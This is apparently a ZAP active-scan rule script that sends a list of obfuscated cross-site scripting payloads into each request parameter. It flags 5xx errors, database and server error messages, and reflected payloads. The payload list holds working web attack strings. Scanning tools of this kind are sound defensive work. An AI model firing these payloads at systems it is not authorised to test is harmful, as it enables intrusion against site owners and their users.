// An active scan rule script which detects if a set of attack payloads evokes an unhandled error or gets reflected in the response
// in order to find potential issues.

// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable"  

// Replace or extend these with your own attacks
var attacks = [
 '>"><script>alert("XSS")</script>&',
 '"><STYLE>@import"javascript:alert(\'XSS\')";</STYLE>',
 '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;',
 'alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>',
 '>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>',
 '\'%uff1cscript%uff1ealert(\'XSS\')%uff1c/script%uff1e\'',
 '">',
 '>"',
 '\'\';!--"<XSS>=&{()}',
 '<IMG SRC="javascript:alert(\'XSS\');">',
 '<IMG SRC=javascript:alert(\'XSS\')>',
 '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
 '<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>',
 '<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;',
 '&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>',
 '<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116:',
 '&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>',
 '<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74(',
 '&<WBR>#x27&#x58&#x53&#x53&#x29>7&#x2',
 '<IMG SRC="jav&#x09;ascript:alert(<WBR>\'XSS\');">',
 '<IMG SRC="jav&#x0A;ascript:alert(<WBR>\'XSS\');">',
 '<IMG SRC="jav&#x0D;ascript:alert(<WBR>\'XSS\');">'
]

// Replace or extend these with your own evidence - regexes that indicate potential issues
// These a subset of https://github.com/fuzzdb-project/fuzzdb/blob/master/regex/errors.txt
var evidence = [
	"A syntax error has occurred",
	"Active Server Pages error",
	"ADODB.Field error",
	"An illegal character has been found in the statement",
	"An unexpected token .* was found",
	"ASP\.NET is configured to show verbose error messages",
	"ASP\.NET_SessionId",
	"Custom Error Message",
	"database error",
	"DB2 Driver",
	"DB2 Error",
	"DB2 ODBC",
	"detected an internal error",
	"Error converting data type varchar to numeric",
	"Error Diagnostic Information",
	"Error Report",
	"Fatal error",
	"Incorrect syntax near",
	"Index of",
	"Internal Server Error",
	"Invalid Path Character",
	"Invalid procedure call or argument",
	"invalid query",
	"Invision Power Board Database Error",
	"is not allowed to access",
	"JDBC Driver",
	"JDBC Error",
	"JDBC MySQL",
	"JDBC Oracle",
	"JDBC SQL",
	"Microsoft OLE DB Provider for ODBC Drivers",
	"Microsoft VBScript compilation error",
	"Microsoft VBScript error",
	"MySQL Driver",
	"mysql error",
	"MySQL Error",
	"mySQL error with query",
	"MySQL ODBC",
	"ODBC DB2",
	"ODBC Driver",
	"ODBC Error",
	"ODBC Microsoft Access",
	"ODBC Oracle",
	"ODBC SQL",
	"OLE/DB provider returned message",
	"on line",
	"on MySQL result index",
	"Oracle DB2",
	"Oracle Driver",
	"Oracle Error",
	"Oracle ODBC",
	"Parent Directory",
	"PHP Error",
	"PHP Parse error",
	"PHP Warning",
	"PostgreSQL query failed",
	"server object error",
	"SQL command not properly ended",
	"SQL Server Driver",
	"SQLException",
	"supplied argument is not a valid",
	"Syntax error in query expression",
	"The error occurred in",
	"The script whose uid is",
	"Type mismatch",
	"Unable to jump to row",
	"Unclosed quotation mark before the character string",
	"unexpected end of SQL command",
	"unexpected error",
	"Unterminated string constant",
	"Warning: mysql_query",
	"Warning: pg_connect",
	"You have an error in your SQL syntax near"
]

/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {
	// Do nothing here - this script just attacks parameters rather than nodes
}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {
	// get the standard request to see if there are any errors
	stmsg = msg = msg.cloneRequest();
	as.setParam(msg, param, value);
	as.sendAndReceive(msg);
	var stcode = msg.getResponseHeader().getStatusCode(); //status code of standard request to detect differences
	var stbody = msg.getResponseBody().toString(); //same for body
	// go through every defined attack
	for (var i in attacks) {
		// Copy requests before reusing them
		msg = msg.cloneRequest();

		as.setParam(msg, param, attacks[i]);
		
		as.sendAndReceive(msg, false, false);

		var code = msg.getResponseHeader().getStatusCode()
		// detect unexpected error http codes
		if (code >= 500 && code < 600 && code != stcode) {
			raiseAlert(as, msg, param, attacks[i], code.toString(),2,1, 'malicious XSS input caused 5XX http status code')
		}
		// check for the evidence regexes
		var body = msg.getResponseBody().toString()
		var re = new RegExp(evidence.join("|"), "i")
		var found = body.match(re)
		if (found) {
			raiseAlert(as, msg, param, attacks[i], found.toString(), 2,1, 'malicious XSS input caused Error Message')
		}
		// check whether the malicious XSS payload is in the response (and was not there before)
	 	if ( body.contains(attacks[i]) && !stbody.contains(attacks[i])) {
			raiseAlert(as, msg, param, attacks[i], attacks[i] + " in response" , 0,1, 'malicious XSS input got reflected in the requests response')
		}
		// regularily check if the scan was stopped
		if (as.isStop()) {
			return;
		}
	}
}

// raises an alert directly to the Alerts tab and consequently all reports
function raiseAlert(as, msg, param, attack, evidence, risk, confidence, info) {
	// raiseAlert(risk, int confidence, String name, String description, String uri, 
	//		String param, String attack, String otherInfo, String solution, String evidence, 
	//		int cweId, int wascId, HttpMessage msg)
	// risk: 0: info, 1: low, 2: medium, 3: high
	// confidence: 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
	as.raiseAlert(risk, confidence, 'Custom Reflected XSS Error', 'unexpected value caused unexpected behavior', 
		msg.getRequestHeader().getURI().toString(), 
		param, attack, info, 'Please contact a security expert', evidence, 0, 0, msg);
}

